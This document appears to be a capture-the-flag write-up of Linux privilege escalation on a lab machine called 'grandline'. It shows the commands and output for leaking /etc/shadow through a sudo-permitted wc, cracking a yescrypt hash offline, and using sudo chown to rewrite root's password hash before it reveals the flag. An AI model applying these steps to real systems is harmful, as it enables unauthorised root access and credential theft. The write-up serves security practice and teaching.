# Grandline 2 — Privilege Escalation

> Continues from **Grandline #1** (`grandline-1-user.md`). Starting point: already logged in as `zoro`.

## Techniques used

- Sudo misconfiguration enumeration
- GTFOBins arbitrary file read
- Offline yescrypt hash cracking
- GTFOBins `chown` privilege escalation

## Tools used

- sudo
- wc
- python3
- chown
- openssl

## Commands and output

### 1. Sudo enumeration

```bash
$ sudo -l
```

```text
User zoro may run the following commands on grandline:
    (root) NOPASSWD: /usr/bin/wc
```

### 2. Reading world-readable sudoers.d files

```bash
$ cat /etc/sudoers.d/luffy
```

```text
luffy ALL=(root) NOPASSWD: /bin/chown
```

### 3. Leaking arbitrary root-owned files with wc

`wc --files0-from=FILE` parses FILE as NUL separated paths,without embedded NUL bytes the whole content becomes one invalid path and the error message leaks it.

```bash
$ sudo /usr/bin/wc --files0-from=/etc/shadow
```

```text
wc: '...zoro:$y$j9T$mJLv1ALgE3jaPEVVEdHUf0$...
      luffy:$y$j9T$/eQAkWW1lsj0UU4Nz/Wu30$Gj0pvuvZoAEGXQ/fD/aXgJ9w7JLsipiHJxnq6BkVNLC:...': File name too long
```

### 4. Cracking luffy's password offline

The API's displayed password for luffy ("ThisIsN0tMyPassword") turned out to be a decoy. The real yescrypt hash was cracked locally with rockyou.

```bash
$ python3 crack_yescrypt_mp.py rockyou.txt 500000
```

```text
FOUND: onepiece
```

### 5. Switching to luffy

SSH rejects password auth for `luffy` directly, but `su` works:

```bash
$ su luffy
Password: onepiece
```

### 6. Privilege escalation via chown

```bash
$ sudo /bin/chown luffy /etc/shadow
```

```bash
$ openssl passwd -6 'NewRootPass123!'
$ python3 -c "
content = open('/etc/shadow').read()
content = content.replace('root:*:', 'root:\$6\$.../.../...:', 1)
open('/etc/shadow', 'w').write(content)
"
```

### 7. Becoming root

```bash
$ su root
Password: NewRootPass123!
$ ls -la /root
```

```text
-rw-r--r-- 1 root root   68 Jul 23 13:42 ThisIsATre4sureDidYouExpectRootDotTXT.txt
```

### 8. Reading the flag

```bash
$ cat /root/ThisIsATre4sureDidYouExpectRootDotTXT.txt
```

```text
EPI{R_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}
```

## Evidence

- Cracked password: `luffy` / `onepiece`
- Flag: `EPI{R_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}`
